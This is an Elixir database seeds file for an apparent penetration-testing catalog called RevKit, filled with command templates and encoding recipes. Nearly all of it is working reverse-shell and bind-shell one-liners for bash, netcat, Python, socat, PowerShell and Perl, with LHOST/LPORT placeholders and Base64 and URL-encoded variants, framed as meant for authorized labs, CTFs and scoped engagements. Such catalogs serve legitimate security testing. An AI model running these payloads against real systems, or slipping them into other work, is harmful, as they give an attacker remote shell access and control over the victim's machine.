# Seed the curated public catalog and its fixed tag vocabulary.
#
#     mix ecto.reset
#
# Public rows are read-only. Every template is a string for authorized labs,
# CTFs, and scoped engagements; RevKit never executes a payload.

alias Revkit.Catalog

defmodule Revkit.Seeds do
  @moduledoc false

  @tag_names ~w(
    linux windows macos bash sh powershell python perl netcat socat
    reverse-shell bind-shell transport base64 url-encode wrapper pty
    legacy web ctf pentest persistence privilege-escalation exfiltration
  )

  def tag_names, do: @tag_names

  def payloads do
    [
      %{
        name: "Bash TCP reverse shell",
        description: "Linux target with bash and /dev/tcp; outbound TCP to your listener.",
        template: "bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1",
        target_os: "linux",
        target_shell: "bash",
        target_tools: ["bash"],
        notes:
          "For authorized Linux engagements. Start a listener that can receive the outbound connection, then set LHOST/LPORT. The session may be non-interactive; upgrade it if the engagement permits.",
        tags: ["linux", "bash", "reverse-shell"]
      },
      %{
        name: "Netcat FIFO reverse shell",
        description: "Linux target with netcat and mkfifo; portable alternative to nc -e.",
        template:
          "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {{LHOST}} {{LPORT}} > /tmp/f",
        target_os: "linux",
        target_shell: "sh",
        target_tools: ["nc", "mkfifo", "sh"],
        notes:
          "Use when netcat does not support -e. It requires outbound TCP and leaves /tmp/f behind; remove it after testing. The shell is usually non-interactive.",
        tags: ["linux", "netcat", "reverse-shell"]
      },
      %{
        name: "Python 3 reverse shell",
        description: "Cross-platform target with python3 and outbound TCP.",
        template:
          ~S|python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{{LHOST}}",{{LPORT}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'|,
        target_os: "linux",
        target_shell: "sh",
        target_tools: ["python3"],
        notes:
          "Use when python3 is present and outbound TCP is allowed. Quoting differs between shells; verify the rendered command in the target shell context. No Python packages beyond the standard library are required.",
        tags: ["linux", "python", "reverse-shell"]
      },
      %{
        name: "Socat PTY reverse shell",
        description: "Linux target with socat; provides a PTY for a more stable session.",
        template:
          "socat tcp-connect:{{LHOST}}:{{LPORT}} exec:/bin/sh,pty,stderr,setsid,sigint,sane",
        target_os: "linux",
        target_shell: "sh",
        target_tools: ["socat"],
        notes:
          "Use when socat is available and you need a PTY. It still depends on outbound TCP and target firewall policy. Socat may be uncommon on minimal images.",
        tags: ["linux", "socat", "reverse-shell"]
      },
      %{
        name: "PowerShell TCP reverse shell",
        description: "Windows target with PowerShell and outbound TCP.",
        template:
          String.trim(~S"""
          $c=New-Object System.Net.Sockets.TCPClient("{{LHOST}}",{{LPORT}});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r=$r+"PS "+(pwd).Path+"> ";$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()
          """),
        target_os: "windows",
        target_shell: "powershell",
        target_tools: ["powershell"],
        notes:
          "For authorized Windows testing only. Expect high endpoint-detection visibility. Execution policy, logging, and network controls can block it. The LHOST value is embedded as a PowerShell string.",
        tags: ["windows", "powershell", "reverse-shell"]
      },
      %{
        name: "Bash bind shell",
        description: "Linux target that can accept inbound TCP to the chosen port.",
        template: "nc -lvnp {{LPORT}} -e /bin/bash",
        target_os: "linux",
        target_shell: "bash",
        target_tools: ["nc", "bash"],
        notes:
          "Use only when inbound access to the target is permitted and outbound egress is restricted. The target listens; connect to it from the authorized test host. Requires a netcat build with -e.",
        tags: ["linux", "netcat", "bind-shell"]
      },
      %{
        name: "Netcat bind shell (sh)",
        description: "Minimal Linux bind shell for a target with netcat and /bin/sh.",
        template: "nc -lvnp {{LPORT}} -e /bin/sh",
        target_os: "linux",
        target_shell: "sh",
        target_tools: ["nc", "sh"],
        notes:
          "Same constraints as the Bash bind shell, with a smaller shell. Inbound reachability and firewall rules must allow the chosen port.",
        tags: ["linux", "netcat", "bind-shell"]
      },
      %{
        name: "Perl reverse shell",
        description: "Older Unix-like target with Perl and outbound TCP.",
        template:
          ~S|perl -e 'use Socket;$i="{{LHOST}}";$p={{LPORT}};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}'|,
        target_os: "linux",
        target_shell: "sh",
        target_tools: ["perl"],
        notes:
          "Useful for legacy systems where Perl is present but Python or a modern netcat is not. It depends on outbound TCP and /bin/sh.",
        tags: ["linux", "perl", "reverse-shell"]
      }
    ]
  end

  def recipes do
    [
      %{
        name: "Bash TCP + Base64",
        description: "Transport-encode a Bash TCP payload as Base64.",
        template: "bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1",
        variables: %{"LHOST" => "127.0.0.1", "LPORT" => "4444"},
        steps: [%{"key" => "base64_encode", "options" => %{}}],
        target_os: "linux",
        target_shell: "bash",
        target_tools: ["bash", "base64"],
        notes:
          "The generated value is Base64, not a directly executable command. Decode it in the target context only when your authorized transport process requires it.",
        tags: ["linux", "base64", "transport"]
      },
      %{
        name: "Bash TCP + Bash wrapper",
        description: "Wrap the rendered Bash TCP command in bash -c.",
        template: "bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1",
        variables: %{"LHOST" => "127.0.0.1", "LPORT" => "4444"},
        steps: [%{"key" => "bash_wrapper", "options" => %{}}],
        target_os: "linux",
        target_shell: "bash",
        target_tools: ["bash"],
        notes:
          "The output is directly executable in a context where the outer shell invokes bash. It still requires outbound TCP and a listener.",
        tags: ["linux", "wrapper", "reverse-shell"]
      },
      %{
        name: "Bash TCP + URL encode",
        description: "Transport-encode a Bash TCP payload for URL-oriented delivery.",
        template: "bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1",
        variables: %{"LHOST" => "127.0.0.1", "LPORT" => "4444"},
        steps: [%{"key" => "url_encode", "options" => %{}}],
        target_os: "linux",
        target_shell: "bash",
        target_tools: ["bash"],
        notes:
          "The output is percent-encoded and is not directly executable. Decode it at the transport boundary; the target still needs bash and outbound TCP.",
        tags: ["linux", "url-encode", "transport"]
      },
      %{
        name: "Bash TCP + Base64 + URL encode",
        description: "Double transport encoding for a Bash TCP payload.",
        template: "bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1",
        variables: %{"LHOST" => "127.0.0.1", "LPORT" => "4444"},
        steps: [
          %{"key" => "base64_encode", "options" => %{}},
          %{"key" => "url_encode", "options" => %{}}
        ],
        target_os: "linux",
        target_shell: "bash",
        target_tools: ["bash", "base64"],
        notes:
          "The output is URL-encoded Base64. Decode in reverse order at the transport boundary. This is not a directly executable shell command.",
        tags: ["linux", "base64", "transport"]
      },
      %{
        name: "Netcat FIFO + Bash wrapper",
        description: "Wrap the netcat FIFO reverse shell in bash -c.",
        template:
          "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {{LHOST}} {{LPORT}} > /tmp/f",
        variables: %{"LHOST" => "127.0.0.1", "LPORT" => "4444"},
        steps: [%{"key" => "bash_wrapper", "options" => %{}}],
        target_os: "linux",
        target_shell: "sh",
        target_tools: ["bash", "nc", "mkfifo", "sh"],
        notes:
          "Requires bash as the outer wrapper and an OpenBSD-style netcat without -e. The wrapper does not remove /tmp/f for you.",
        tags: ["linux", "netcat", "wrapper"]
      },
      %{
        name: "Python 3 + URL encode",
        description: "Transport-encode the Python 3 reverse shell.",
        template:
          ~S|python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{{LHOST}}",{{LPORT}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'|,
        variables: %{"LHOST" => "127.0.0.1", "LPORT" => "4444"},
        steps: [%{"key" => "url_encode", "options" => %{}}],
        target_os: "linux",
        target_shell: "sh",
        target_tools: ["python3"],
        notes:
          "The output is percent-encoded and must be decoded before use. Verify quoting after decoding; Python remains required on the target.",
        tags: ["linux", "python", "transport"]
      }
    ]
  end
end

{:ok, tags} = Catalog.ensure_tags(Revkit.Seeds.tag_names())
tag_ids = Map.new(tags, fn tag -> {tag.name, tag.id} end)

Enum.each(Revkit.Seeds.payloads(), fn payload ->
  unless Enum.any?(Catalog.list_public_payloads(), &(&1.name == payload.name)) do
    {tag_names, attrs} = Map.pop(payload, :tags)
    ids = Enum.map(tag_names, &Map.fetch!(tag_ids, &1))
    {:ok, _payload} = Catalog.create_public_payload(attrs, ids)
  end
end)

Enum.each(Revkit.Seeds.recipes(), fn recipe ->
  unless Enum.any?(Catalog.list_public_recipes(), &(&1.name == recipe.name)) do
    {tag_names, attrs} = Map.pop(recipe, :tags)
    ids = Enum.map(tag_names, &Map.fetch!(tag_ids, &1))
    {:ok, _recipe} = Catalog.create_public_recipe(attrs, ids)
  end
end)
